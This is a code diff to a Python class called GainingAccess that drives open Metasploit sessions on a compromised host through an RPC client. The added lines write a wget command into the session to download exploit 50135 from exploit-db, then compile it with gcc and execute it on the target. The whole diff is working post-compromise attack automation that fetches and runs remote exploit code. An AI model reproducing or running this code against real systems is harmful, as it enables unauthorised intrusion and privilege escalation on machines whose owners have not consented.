@@ -28,19 +28,21 @@ class GainingAccess():
             print(e)
     
     # send the command trouch the open session to download the exploit       
-    def sendCommand(self):
-        print("Sessions available: ")
-        for s in client.sessions.list.keys():
-            print(s)
-            
+    def sendCommand(self):            
         shell = client.sessions.session(list(client.sessions.list.keys())[0])
 
         # Write to the shell
-        # shell.write('whoami')
-        shell.write('whoami')
+        shell.write('wget https://www.exploit-db.com/download/50135 -O exploit.c')
         # Print the output
 
         print(shell.read())
     
     def exploitTarget(self):
-        pass
+        shell = client.sessions.session(list(client.sessions.list.keys())[0])
+        
+        #compiling the exploit
+        shell.write('gcc exploit.c -o exploit')
+        
+        shell.write('./exploit')
+        
+        print(shell.read())
